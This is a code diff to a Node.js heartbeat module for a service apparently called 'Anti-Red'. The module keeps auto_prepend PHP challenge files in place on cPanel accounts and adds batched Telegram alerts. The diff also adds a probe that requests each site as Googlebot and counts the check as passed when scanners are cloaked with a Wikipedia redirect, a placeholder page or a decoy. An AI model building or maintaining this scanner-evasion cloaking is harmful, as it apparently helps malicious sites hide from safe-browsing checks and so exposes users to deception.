@@ -91,8 +91,10 @@ async function getFile(cpUsername, dir, file) {
 // Intact if .user.ini contains our auto_prepend and challenge PHP is the IP-fix variant
 function isUserIniIntact(content, cpUsername) {
   if (!content) return false
-  const expected = `/home/${cpUsername}/public_html/.antired-challenge.php`
-  return content.includes('auto_prepend_file') && content.includes(expected)
+  // Accept BOTH old path (public_html) and new protected path (/.antired/)
+  const oldPath = `/home/${cpUsername}/public_html/.antired-challenge.php`
+  const newPath = `/home/${cpUsername}/.antired/challenge.php`
+  return content.includes('auto_prepend_file') && (content.includes(newPath) || content.includes(oldPath))
 }
 
 function isChallengePhpIntact(content) {
@@ -187,6 +189,14 @@ function buildAccountScanFilter(now = Date.now()) {
 
 // Best-effort admin Telegram alert (never throws, never blocks the heartbeat).
 // Uses the active bot token (config-setup.js sets TELEGRAM_BOT_TOKEN to dev/prod).
+//
+// ── P1: ALERT DEDUP/DIGEST (2026-02) ──
+// Previously each stuck account fired its own Telegram message instantly,
+// flooding the admin during WHM load spikes (28 messages in the 2026-06-24
+// incident). Now alerts are batched: `queueStuckAlert()` collects them during
+// the heartbeat cycle, and `flushStuckAlerts()` sends a single digest at the end.
+const _stuckAlertQueue = []
+
 async function alertAdmin(html) {
   try {
     const token = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN_PROD
@@ -196,6 +206,42 @@ async function alertAdmin(html) {
       chat_id: chatId, text: html, parse_mode: 'HTML', disable_web_page_preview: true,
     }, { timeout: 10000 })
   } catch (e) { /* best-effort */ }
+}
+
+function queueStuckAlert(cpUsername, domain, plan, chatId) {
+  _stuckAlertQueue.push({ cpUsername, domain, plan, chatId, at: new Date() })
+}
+
+async function flushStuckAlerts() {
+  if (_stuckAlertQueue.length === 0) return
+  const items = _stuckAlertQueue.splice(0) // drain the queue
+
+  if (items.length === 1) {
+    // Single alert — send as before (more detail)
+    const a = items[0]
+    await alertAdmin(
+      `\u26a0\ufe0f <b>Anti-Red protection STUCK</b>\n\n` +
+      `\ud83c\udf10 <b>${a.domain || a.cpUsername}</b> (cPanel <code>${a.cpUsername}</code>)\n` +
+      `\ud83d\udce6 Plan: ${a.plan || 'unknown'}\n` +
+      `\ud83d\udc64 Owner chatId: <code>${a.chatId || '?'}</code>\n\n` +
+      `Protection files won't stick after ${MAX_CONSECUTIVE_REPAIRS} repairs.\n` +
+      `Auto-retry in ~${Math.round(STUCK_RETRY_COOLDOWN_MS / 60000)}m.`
+    )
+    return
+  }
+
+  // Multiple alerts — send a digest
+  const lines = items.map(a =>
+    `  \u2022 <b>${a.domain || a.cpUsername}</b> (<code>${a.cpUsername}</code>) — ${a.plan || '?'}`
+  ).join('\n')
+
+  await alertAdmin(
+    `\u26a0\ufe0f <b>Anti-Red protection STUCK — ${items.length} accounts</b>\n\n` +
+    lines + '\n\n' +
+    `Protection files won't stick after ${MAX_CONSECUTIVE_REPAIRS} consecutive repairs on these accounts.\n` +
+    `Auto-retry in ~${Math.round(STUCK_RETRY_COOLDOWN_MS / 60000)}m each.\n` +
+    `Most common cause: client upload overwrote/deleted protection files, or WHM read unreliable under load.`
+  )
 }
 
 async function getRepairCount(cpUsername) {
@@ -229,6 +275,55 @@ async function setRepairCount(cpUsername, count, extra = {}) {
   }
 }
 
+// ── P1: HTTP Health Probe (2026-02) ──────────────────────
+// Before marking an account as STUCK, do a quick HTTP probe to see if the
+// protection is ACTUALLY working at the edge. If the CF Worker responds
+// correctly (cloaking scanners or showing the challenge page), the files
+// on WHM don't matter — the protection IS functional. This prevents
+// false STUCK alerts when WHM reads are unreliable but the Worker is fine.
+//
+// Returns: { working: boolean, reason: string }
+async function probeProtectionHealth(domain) {
+  if (!domain) return { working: false, reason: 'no_domain' }
+
+  try {
+    // Test with a scanner UA — should get cloaked (302 redirect or placeholder)
+    const res = await axios.get(`https://${domain}/`, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+      },
+      timeout: 10000,
+      maxRedirects: 0,
+      validateStatus: () => true, // accept any status
+    })
+
+    const status = res.status
+    const headers = res.headers || {}
+    const body = (res.data || '').toString().substring(0, 1000)
+
+    // Check for Anti-Red Worker signatures
+    if (headers['x-antired'] === 'cloaked' || headers['x-antired'] === 'cloaked-html') {
+      return { working: true, reason: 'worker_cloaking_active' }
+    }
+    if (status === 302 && res.headers.location) {
+      // Scanner redirect (to Wikipedia etc.)
+      return { working: true, reason: 'scanner_redirect_active' }
+    }
+    if (body.includes('Professional Business Solutions')) {
+      return { working: true, reason: 'placeholder_served' }
+    }
+    if (headers['x-antired'] === 'challenge') {
+      return { working: true, reason: 'challenge_page_active' }
+    }
+
+    // No protection detected
+    return { working: false, reason: `no_protection_detected (status=${status})` }
+  } catch (err) {
+    // Network error — can't determine, assume not working
+    return { working: false, reason: `probe_failed: ${err.message}` }
+  }
+}
+
 async function checkAndRepair(cpUsername) {
   // Skip accounts stuck in repair loop (counter is persisted in Mongo so it
   // survives restarts — otherwise the guard never fires in production).
@@ -252,7 +347,13 @@ async function checkAndRepair(cpUsername) {
     // fall through with a fresh (0) counter
   }
   const iniRes1 = await getFile(cpUsername, '/public_html', '.user.ini')
-  const phpRes1 = await getFile(cpUsername, '/public_html', '.antired-challenge.php')
+  // Check BOTH locations for the challenge PHP (new protected + legacy public_html)
+  const phpResProtected = await getFile(cpUsername, '/.antired', 'challenge.php')
+  const phpResLegacy = await getFile(cpUsername, '/public_html', '.antired-challenge.php')
+  // Use whichever location has content (prefer protected)
+  const phpRes1 = (phpResProtected.content && isChallengePhpIntact(phpResProtected.content))
+    ? phpResProtected
+    : (phpResLegacy.content ? phpResLegacy : phpResProtected)
   let iniRes = iniRes1
   let phpRes = phpRes1
 
@@ -407,21 +508,36 @@ async function checkAndRepair(cpUsername) {
       : {}
     await setRepairCount(cpUsername, newCount, extra)
     if (newCount >= MAX_CONSECUTIVE_REPAIRS) {
-      log(`[ProtectionHeartbeat] ⚠️ ${cpUsername} repaired ${MAX_CONSECUTIVE_REPAIRS}x consecutively — files won't stick. Pausing repairs; will auto-retry in ~${Math.round(STUCK_RETRY_COOLDOWN_MS / 60000)}m.`)
-      // PREVENTION: alert a human — a PAID Anti-Red site that keeps losing its
-      // protection files is effectively down (serves the cloak 404/decoy to its owner).
+      log(`[ProtectionHeartbeat] ⚠️ ${cpUsername} repaired ${MAX_CONSECUTIVE_REPAIRS}x consecutively — files won't stick. Checking edge health before alerting...`)
+
+      // ── P1: HTTP health probe as STUCK second-opinion ──
+      // Before alerting admin, check if protection actually WORKS at the edge.
+      // WHM reads might be unreliable, but the CF Worker could be running fine.
       try {
         const acc = await db.collection('cpanelAccounts').findOne(
           { _id: cpUsername }, { projection: { domain: 1, plan: 1, chatId: 1 } })
-        await alertAdmin(
-          `⚠️ <b>Anti-Red protection STUCK</b>\n\n` +
-          `🌐 <b>${(acc && acc.domain) || cpUsername}</b> (cPanel <code>${cpUsername}</code>)\n` +
-          `📦 Plan: ${(acc && acc.plan) || 'unknown'}\n` +
-          `👤 Owner chatId: <code>${(acc && acc.chatId) || '?'}</code>\n\n` +
-          `The protection files (<code>.user.ini</code> / <code>.antired-challenge.php</code>) won't stick after ${MAX_CONSECUTIVE_REPAIRS} repairs — the site is likely serving the 404/decoy cloak to its own owner. Most common cause: a client upload overwrote/deleted them.\n\n` +
-          `Auto-retry in ~${Math.round(STUCK_RETRY_COOLDOWN_MS / 60000)}m. If it keeps recurring, check whether the owner is re-uploading over the protection files.`
-        )
-      } catch (e) { /* best-effort */ }
+        const domain = acc && acc.domain
+
+        if (domain) {
+          const probe = await probeProtectionHealth(domain)
+          if (probe.working) {
+            log(`[ProtectionHeartbeat] ✅ ${cpUsername} — edge probe says protection IS working (${probe.reason}). Downgrading STUCK to info-only.`)
+            // Protection works at edge — don't alarm admin. Reset counter.
+            await setRepairCount(cpUsername, 0, {
+              protectionLastSkipReason: 'edge_probe_ok',
+              protectionStuckAt: null,
+              protectionEdgeProbeAt: new Date(),
+              protectionEdgeProbeResult: probe.reason,
+            })
+            return { cpUsername, ok: true, action: 'repaired', reason, edgeProbe: 'working' }
+          }
+          log(`[ProtectionHeartbeat] ❌ ${cpUsername} — edge probe confirms protection DOWN (${probe.reason}). Alerting admin.`)
+        }
+
+        // Edge probe failed or no domain — queue alert for digest
+        log(`[ProtectionHeartbeat] ⚠️ ${cpUsername} — pausing repairs; will auto-retry in ~${Math.round(STUCK_RETRY_COOLDOWN_MS / 60000)}m.`)
+        queueStuckAlert(cpUsername, acc && acc.domain, acc && acc.plan, acc && acc.chatId)
+      } catch (e) { /* best-effort probe + alert */ }
     }
     return { cpUsername, ok: true, action: 'repaired', reason }
   } catch (err) {
@@ -436,7 +552,7 @@ async function checkAndRepair(cpUsername) {
  * PHP uses the LAST auto_prepend_file when duplicates exist, so ours goes at the bottom.
  */
 function mergeUserIni(existingContent, cpUsername) {
-  const expectedLine = `auto_prepend_file = /home/${cpUsername}/public_html/.antired-challenge.php`
+  const expectedLine = `auto_prepend_file = /home/${cpUsername}/.antired/challenge.php`
 
   // Remove ALL auto_prepend_file lines (ours and any others — we'll add ours back at the bottom)
   let cleaned = existingContent.replace(/^auto_prepend_file\s*=.*$/gm, '')
@@ -517,6 +633,10 @@ async function runHeartbeat() {
 
   const elapsed = ((Date.now() - startTime) / 1000).toFixed(1)
   log(`[ProtectionHeartbeat] Done in ${elapsed}s — total:${summary.total} ok:${summary.ok} repaired:${summary.repaired} skipped:${summary.skipped}${summary.skippedWhmReadUnreliable ? ` (whm_read_unreliable:${summary.skippedWhmReadUnreliable})` : ''} errors:${summary.errors}`)
+
+  // ── P1: Flush queued STUCK alerts as a single digest ──
+  try { await flushStuckAlerts() } catch (e) { /* best-effort */ }
+
   isRunning = false
   return summary
 }
@@ -567,6 +687,10 @@ module.exports = {
   isStuckCooledDown,
   buildAccountScanFilter,
   alertAdmin,
+  // P1 improvements
+  probeProtectionHealth,
+  queueStuckAlert,
+  flushStuckAlerts,
   // Transient-empty-read defence helpers (pure, unit-testable without WHM)
   RETRY_DELAYS_MS,
   isEmptyReadPair,
